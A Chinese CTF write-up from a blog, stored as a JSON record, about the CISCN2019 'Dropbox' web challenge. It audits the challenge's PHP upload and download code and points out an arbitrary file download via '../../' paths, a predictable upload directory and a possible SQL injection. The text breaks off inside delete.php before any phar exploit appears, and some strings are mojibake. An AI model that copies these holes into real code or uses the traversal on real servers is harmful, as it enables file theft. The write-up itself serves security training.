{"blogid": "123422416", "writerAge": "码龄3年", "writerBlogNum": "35", "writerCollect": "20", "writerComment": "7", "writerFan": "3", "writerGrade": "2级", "writerIntegral": "388", "writerName": "Red snow", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_123422416.jpg", "writerRankTotal": "47241", "writerRankWeekly": "411733", "writerThumb": "5", "writerVisitNum": "44414", "blog_read_count": "1866", "blog_time": "于 2022-03-11 13:30:10 发布", "blog_title": "[CISCN2019 华北赛区 Day1 Web1]Dropbox （phar反序列化）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h2><a id=\"CISCN2019__Day1_Web1Dropbox_phar_0\"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox （phar反序列化）</h2>\n<p>经过测试，发现这里有个任意文件下载的漏洞，根据程序功能，下载到网站源码：</p>\n<p><img alt=\"\" src=\"..\\..\\static\\image\\2a3fcbe4d54b4e139c8faa4f7a2b88ed.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dd7b7761c03f4169869651ccd3fe3cd6.png\"/><br/> 注意下本地环境：<br/> <img alt=\"\" src=\"..\\..\\static\\image\\c09b7f55edb54c458a75b846ab99c7fb.png\"/></p>\n<p>代码审计：login.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token double-quoted-string string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'register'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;script&gt;toast('娉ㄥ唽鎴愬姛', 'info');&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"username\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$u</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 初始化User对象</span>\n    <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"username\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">20</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$u</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">verify_user</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># username长度小于20，调用verify_user方法验证username和password</span>\n        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'login'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># session设置login、username（这里还对username做了处理）、sandbox</span>\n        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$sandbox</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\"uploads/\"</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">sha1</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'username'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">.</span> <span class=\"token double-quoted-string string\">\"sftUahRiTz\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token double-quoted-string string\">\"/\"</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 上传路径：uploads/sha1(username+sftUahRiTz)/</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'sandbox'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$sandbox</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"&lt;script&gt;window.location.href='index.php';&lt;/script&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;script&gt;toast('璐﹀彿鎴栧瘑鐮侀敊璇�', 'warning');&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<ul><li>这里可能有sql注入，具体要看verify_user方法</li><li>还注意到上传路径，其实是已知的</li></ul>\n<p>register.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token double-quoted-string string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"username\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$u</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"username\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"password\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">20</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">2</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># 限制username长度小于20，大于2，密码长度大于1</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">add_user</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\"># 调用add_user方法</span>\n            <span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"&lt;script&gt;window.location.href='login.php?register';&lt;/script&gt;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;script&gt;toast('姝ょ敤鎴峰悕宸茶浣跨敤', 'warning');&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"&lt;script&gt;toast('璇疯緭鍏ユ湁鏁堢敤鎴峰悕鍜屽瘑鐮�', 'warning');&lt;/script&gt;\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<p>upload.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Location: login.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">include</span> <span class=\"token double-quoted-string string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> \t<span class=\"token shell-comment comment\"># 文件名</span>\n    <span class=\"token variable\">$pos</span> <span class=\"token operator\">=</span> <span class=\"token function\">strrpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\".\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token shell-comment comment\"># 查找.最后出现的位置</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$pos</span> <span class=\"token operator\">!==</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pos</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token shell-comment comment\"># 截取最后出现.前的字符串</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token variable\">$fileext</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\".gif\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"type\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token shell-comment comment\">#文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。</span>\n        <span class=\"token keyword\">case</span> <span class=\"token single-quoted-string string\">'image/gif'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token variable\">$fileext</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\".gif\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token single-quoted-string string\">'image/jpeg'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token variable\">$fileext</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\".jpg\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token single-quoted-string string\">'image/png'</span><span class=\"token punctuation\">:</span>\n            <span class=\"token variable\">$fileext</span> <span class=\"token operator\">=</span> <span class=\"token double-quoted-string string\">\".png\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n            <span class=\"token variable\">$response</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"success\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"error\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token double-quoted-string string\">\"Only gif/jpg/png allowed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-type: application/json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$response</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">40</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$dst</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'sandbox'</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$filename</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$fileext</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 所上传文件的存储路径:uploads/sha1(username+sftUahRiTz)/文件名+fileexxt</span>\n        <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$dst</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 文件被上传后在服务端储存的临时文件名。</span>\n        <span class=\"token variable\">$response</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"success\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"error\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token double-quoted-string string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-type: application/json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$response</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$response</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"success\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"error\"</span> <span class=\"token operator\">=</span><span class=\"token operator\">&gt;</span> <span class=\"token double-quoted-string string\">\"Invaild filename\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-type: application/json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$response</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<ul><li>这里注意上传的文件，后缀会强制换成指定的三种</li></ul>\n<p>download.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Location: login.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">include</span> <span class=\"token double-quoted-string string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"open_basedir\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">.</span> <span class=\"token double-quoted-string string\">\":/etc:/tmp\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 就是只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录</span>\n\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 改变当前操作路径为上传文件的路径</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 初始化file对象</span>\n<span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">40</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"flag\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span> <span class=\"token shell-comment comment\"># 文件名不超过40、open方法、文件名中不能有flag</span>\n    <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-type: application/octet-stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">Header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Content-Disposition: attachment; filename=\"</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">basename</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$file</span><span class=\"token operator\">-</span><span class=\"token operator\">&gt;</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token double-quoted-string string\">\"File not exist\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?&gt;</span>\n</code></pre>\n<ul><li>download.php的操作路径被改成了<code>uplaod/sha1()/</code>，这也就是为啥文件下载的时候是 <code>../../index.php</code></li><li>这里看出来确实可以任意文件下载</li></ul>\n<p>delete.php</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"Location: login.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">include</span> <span class=\"token double-quoted-string string\">\"class.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token shell-comment comment\"># 改变当前操作路径为上传文件的路径</span>\n<span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span 